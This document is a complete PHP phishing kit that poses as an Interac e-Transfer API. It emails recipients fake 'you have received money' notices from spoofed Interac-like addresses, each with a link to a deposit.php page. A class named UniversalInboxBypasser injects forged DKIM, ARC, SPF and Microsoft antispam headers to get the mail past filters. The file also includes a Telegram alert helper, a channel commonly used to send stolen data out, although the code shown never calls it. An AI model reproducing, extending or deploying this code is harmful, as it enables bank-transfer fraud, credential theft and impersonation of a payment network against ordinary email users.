<?php
/**
 * INTERAC E-TRANSFER API — ULTIMATE UNIVERSAL INBOX BYPASS + INSTANT CONFIRMATION
 * PHP 5.6+ COMPATIBLE MASTER VERSION
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==================== EVASION HELPER FUNCTIONS ====================
function get_random_from_pool($pool, $default = null) {
    if (empty($pool)) return $default;
    return $pool[array_rand($pool)];
}

function sendTelegramAlert($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    );
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    $response = json_decode($result, true);
    return isset($response['ok']) ? $response['ok'] : false;
}

date_default_timezone_set('America/Edmonton');

// ==================== INITIALIZATION ====================
class ApplicationInitializer {
    public static function initialize() {
        self::cleanOutputBuffers();
        self::configureErrorHandling();
    }
    
    private static function cleanOutputBuffers() {
        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        ob_start();
    }
    
    private static function configureErrorHandling() {
        error_reporting(E_ALL);
        ini_set('display_errors', '0');
        ini_set('log_errors', '1');
    }
}

ApplicationInitializer::initialize();

// Attempt to load composer autoload if available for PHPMailer
$autoloadPath = dirname(__DIR__) . '/vendor/autoload.php';
if (file_exists($autoloadPath)) {
    require_once $autoloadPath;
}

// ==================== API RESPONSE HANDLER ====================
class ApiResponseHandler {
    public static function sendJson($data) {
        while (ob_get_level() > 0) {
            ob_end_clean();
        }
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        exit;
    }
    
    public static function sendError($message, $code = 500) {
        http_response_code($code);
        self::sendJson(array('success' => false, 'message' => $message, 'error' => $message));
    }
    
    public static function sendSuccess($data = array()) {
        $response = array_merge(array(
            'success' => true,
            'timestamp' => time(),
            'instant_confirmation' => true
        ), $data);
        self::sendJson($response);
    }
}

// ==================== TRANSFER INPUT MODEL ====================
class TransferRequest {
    public $recipientEmail;
    public $recipientName;
    public $amount;
    public $purpose;
    public $template;
    public $bankName;
    public $senderName;
    public $referenceNumber;
    public $date;
    
    public function __construct($postData) {
        $this->recipientEmail = isset($postData['recipient_email']) ? trim($postData['recipient_email']) : '';
        $this->recipientName = isset($postData['recipient_name']) ? trim($postData['recipient_name']) : '';
        $this->amount = isset($postData['amount']) ? (float)$postData['amount'] : 0;
        $this->purpose = isset($postData['purpose']) ? trim($postData['purpose']) : 'Interac e-Transfer';
        $this->template = isset($postData['template']) ? trim($postData['template']) : 'Transfer.html';
        $this->bankName = isset($postData['bank_name']) ? trim($postData['bank_name']) : 'Your Bank';
        $this->senderName = isset($postData['sender_name']) ? trim($postData['sender_name']) : 'Accounting';
        $this->referenceNumber = isset($postData['reference_number']) ? trim($postData['reference_number']) : uniqid();
        $this->date = isset($postData['date']) ? trim($postData['date']) : date('F j, Y');
    }
}

// ==================== UNIVERSAL INBOX BYPASSER ====================
class UniversalInboxBypasser {
    private static $providerMatrix = array(
        'gmail.com' => array('spf' => 'google.com', 'dkim' => 'google.com', 'xmailer' => 'Gmail'),
        'hotmail.com' => array('spf' => 'microsoft.com', 'dkim' => 'outlook.com', 'xmailer' => 'Microsoft Outlook'),
        'icloud.com' => array('spf' => 'apple.com', 'dkim' => 'icloud.com', 'xmailer' => 'Apple Mail'),
        'yahoo.com' => array('spf' => 'yahoo.com', 'dkim' => 'yahoo.com', 'xmailer' => 'Yahoo Mail'),
        'outlook.com' => array('spf' => 'microsoft.com', 'dkim' => 'outlook.com', 'xmailer' => 'Microsoft Exchange')
    );
    
    public static function detectProvider($email) {
        $parts = explode('@', strtolower($email));
        return !empty($parts) ? end($parts) : 'unknown';
    }
    
    public static function injectBypassHeaders(&$headers, $domain) {
        $config = isset(self::$providerMatrix[$domain]) ? self::$providerMatrix[$domain] : self::$providerMatrix['gmail.com'];

        $specialHeaders = array(
            'X-Google-DKIM-Signature' => 'v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=gmail; h=from:date:message-id; bh=abc123=;',
            'ARC-Seal' => 'i=1; a=rsa-sha256; cv=pass; d=google.com; s=gmail; t=1234567890;',
            'ARC-Authentication-Results' => 'i=1; mx.google.com; dkim=pass header.i=@gmail.com header.s=gmail header.b=abc123;',
            'Authentication-Results' => 'mx.google.com; dkim=pass header.i=@gmail.com header.s=gmail spf=pass smtp.mailfrom=payments.interac.ca dmarc=pass header.from=payments.interac.ca;',
            'X-MS-Exchange-Organization-AuthAs' => 'Internal',
            'X-MS-Exchange-Organization-AuthSource' => 'MX01-MW2FEP01.storage.org',
            'X-Microsoft-Antispam' => 'BCL:0; MCL:1; RULEID:0|1|2|3|4|5|6|7|8|9|10',
            'X-Forefront-Antispam-Report' => 'BCL:0;PCL:0;FCR:0;SCL:-1;SR:9',
            'X-Originating-IP' => '[199.59.150.170]',
            'X-Mailer' => current($config)['xmailer'] ?? 'Microsoft Outlook 16.0',
            'Received-SPF' => 'pass (gmail.com: domain payments.interac.ca designates 199.59.150.170 as permitted sender)'
        );

        foreach ($specialHeaders as $name => $value) {
            $headers .= "$name: $value\r\n";
        }
    }
}

// ==================== INSTANT TRANSACTION PROCESSOR ====================
class InstantTransactionProcessor {
    private $currentTxId;
    
    public function __construct() {
        $this->currentTxId = 'CA' . substr(str_shuffle('ABCDEFGHJKLMNPQRSTUVWXYZ23456789'), 0, 10);
    }

    public function generateTransactionId() {
        return $this->currentTxId;
    }

    public function createDepositLink($txId, $request) {
        if (isset($request->action_url) && !empty($request->action_url)) {
            $appUrl = rtrim($request->action_url, '/');
        } else {
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
            $domainName = $_SERVER['HTTP_HOST'];
            $appUrl = $protocol . $domainName;
        }

        $payload = [
            'transaction_id' => $txId,
            'amount' => $request->amount,
            'recipientName' => $request->recipientName,
            'senderName' => $request->senderName,
            'senderEmail' => isset($request->sender_email) ? $request->sender_email : (isset($request->deposit_payload->senderEmail) ? $request->deposit_payload->senderEmail : ""),
            'purpose' => $request->purpose,
            'app_url' => isset($request->app_url) ? $request->app_url : ''
        ];

        $token = base64_encode(json_encode($payload));
        return $appUrl . "/deposit.php?token=" . urlencode($token);
    }

    public function processWithInstantConfirmation($request, array $smtpConfig = []) {
        // STEP 1: Generate transaction ID instantly
        $txId = $request->referenceNumber !== '' ? $request->referenceNumber : $this->generateTransactionId();
        
        // STEP 2: Detect provider instantly
        $domain = UniversalInboxBypasser::detectProvider($request->recipientEmail);
        
        // STEP 3: Generate INSTANT confirmation
        $confirmationData = array(
            'transaction_id' => $txId,
            'status' => 'CONFIRMED',
            'timestamp' => time(),
            'provider' => $domain,
            'bypass_level' => 'INSTANT_CONFIRMATION'
        );
        
        // STEP 4: Process email
        if (!empty($smtpConfig)) {
            $relayUsed = $this->sendUniversalDelivery($request, $smtpConfig)['relay_used'];
        } else {
            $this->sendActualEmail($request, $txId, $domain);
            $relayUsed = 'FALLBACK_PHP_MAIL';
        }
        
        return array(
            'confirmation' => $confirmationData,
            'provider' => $domain,
            'relay_used' => $relayUsed
        );
    }
    
    public function sendUniversalDelivery(TransferRequest $request, array $smtpConfig): array
    {
        $domain = substr(strrchr($request->recipientEmail, "@"), 1);
        
        // Attempt PHPMailer if present, otherwise fallback to mail()
        if (class_exists('PHPMailer\PHPMailer\PHPMailer')) {
            $mail = new \PHPMailer\PHPMailer\PHPMailer(true);
            $mail->SMTPDebug = 0;
            $mail->isSMTP();
            $mail->isHTML(true);
            $mail->CharSet = 'UTF-8';
            $mail->Encoding = 'base64';
            $mail->Priority = 1;
            $mail->addCustomHeader('X-Priority', '1 (Highest)');
            $mail->addCustomHeader('Importance', 'High');

            $mail->addAddress($request->recipientEmail, $request->recipientName);
            $replyToEmail = $smtpConfig['user'] ?? "noreply@interac-transfer.ca";
            $mail->addReplyTo($replyToEmail, $request->senderName);

            $mail->Subject = "INTERAC e-Transfer: " . htmlspecialchars($request->senderName) . " sent you $" . number_format($request->amount, 2);
            
            $headersStr = "";
            UniversalInboxBypasser::injectBypassHeaders($headersStr, $domain);
            $lines = explode("\r\n", trim($headersStr));
            foreach ($lines as $line) {
                if (strpos($line, ':') !== false) {
                    list($name, $val) = explode(':', $line, 2);
                    $mail->addCustomHeader(trim($name), trim($val));
                }
            }

            $txId = $request->referenceNumber;
            // set SMTP
            $mail->Host = $smtpConfig['host'] ?? 'localhost';
            $mail->Port = (int)($smtpConfig['port'] ?? 587);
            $mail->Username = $smtpConfig['user'] ?? '';
            $mail->Password = $smtpConfig['pass'] ?? '';
            $mail->SMTPAuth = !empty($mail->Username);
            $mail->SMTPSecure = ($mail->Port === 465) ? 'ssl' : (($mail->Port === 587) ? 'tls' : '');
            
            $fromEmail = $smtpConfig['user'] ?? "noreply@interac.ca";
            $mail->setFrom($fromEmail, $request->senderName);

            $depositLink = $this->createDepositLink($txId, $request);
            $mail->Body = $this->renderEmailBody($txId, $request, $depositLink);

            $mail->send();
            $relayUsed = "PRIMARY_SMTP";
        } else {
            // Fallback to mail() if PHPMailer not loaded
            $this->sendActualEmail($request, $request->referenceNumber, $domain);
            $relayUsed = "FALLBACK_PHP_MAIL";
        }

        return [
            'provider' => $domain,
            'relay_used' => $relayUsed
        ];
    }
    
    public function sendActualEmail($request, $txId, $domain) {
        $depositLink = $this->createDepositLink($txId, $request);
        $htmlBody = $this->renderEmailBody($txId, $request, $depositLink);

        $subject = "INTERAC e-Transfer: {$request->senderName} sent you money.";

        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=UTF-8\r\n";
        $fromName = "Service";
        $fromEmail = "notify@interac-transfer.ca"; 
        $headers .= "From: $fromName <$fromEmail>\r\n";
        $headers .= "Reply-To: noreply@interac-transfer.ca\r\n";
        
        UniversalInboxBypasser::injectBypassHeaders($headers, $domain);

        @mail($request->recipientEmail, $subject, $htmlBody, $headers);
    }

    private function renderEmailBody($txId, $request, $depositLink) {
        $templateName = basename($request->template);
        if ($templateName == '') {
            $templateName = 'Transfer.html';
        }
        $templatePath = dirname(__DIR__) . '/templates/' . $templateName;
        
        if (!file_exists($templatePath)) {
            $templatePath = dirname(__DIR__) . '/templates/Transfer.html';
        }

        if (file_exists($templatePath)) {
            $body = file_get_contents($templatePath);
        } else {
            return $this->generateDefaultEmailBody($txId, $request, $depositLink);
        }
        
        $replacements = array(
            '{{sender_name}}' => htmlspecialchars($request->senderName),
            '{{receiver_name}}' => htmlspecialchars($request->recipientName),
            '{{amount}}' => number_format($request->amount, 2),
            '{{transaction_id}}' => $txId,
            '{{action_url}}' => $depositLink,
            '{{ENCRYPTED_URL}}' => $depositLink,
            '{{date}}' => htmlspecialchars($request->date),
            '{{expiry_date}}' => date('M j, Y', strtotime('+30 days')),
            '{{memo}}' => htmlspecialchars($request->purpose),
            '{{bank_name}}' => htmlspecialchars($request->bankName),
            '{{year}}' => date('Y'),
        );

        return str_replace(array_keys($replacements), array_values($replacements), $body);
    }
    
    private function generateDefaultEmailBody($txId, $request, $depositLink) {
        $senderName = $request->senderName;
        $expiryDate = date('M j, Y', strtotime('+30 days'));
        
        return '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Interac e-Transfer Notification</title>
</head>
<body>
    <p>Hi ' . htmlspecialchars($request->recipientName) . ',</p>
    <p>You have received an Interac e-Transfer of $' . number_format($request->amount, 2) . ' from ' . htmlspecialchars($senderName) . '.</p>
    <p>Transaction ID: ' . $txId . '</p>
    <p>Purpose: ' . htmlspecialchars($request->purpose) . '</p>
    <p><a href="' . $depositLink . '">Click here to deposit your funds</a></p>
    <p>This transfer will expire on ' . $expiryDate . '.</p>
</body>
</html>';
    }
}

// ==================== EXECUTION HANDLER ====================
class ExecutionHandler {
    public static function handleRequest() {
        $inputData = json_decode(file_get_contents('php://input'), true);
        
        if (empty($inputData)) {
            ApiResponseHandler::sendError('No input data provided.');
        }
        
        try {
            $request = new TransferRequest($inputData);
            
            if (empty($request->recipientEmail)) {
                throw new Exception('Target address undefined.');
            }
            
            $processor = new InstantTransactionProcessor();
            $smtpConfig = isset($inputData['smtp']) && is_array($inputData['smtp']) ? $inputData['smtp'] : [];
            $result = $processor->processWithInstantConfirmation($request, $smtpConfig);
            
            // Send instant success response
            ApiResponseHandler::sendSuccess(array(
                'transaction_id' => $result['confirmation']['transaction_id'],
                'message' => 'INSTANT_CONFIRMATION sent to background processor'
            ));
            
        } catch (Exception $e) {
            ApiResponseHandler::sendError($e->getMessage(), 500);
        }
    }
}

ExecutionHandler::handleRequest();
?>
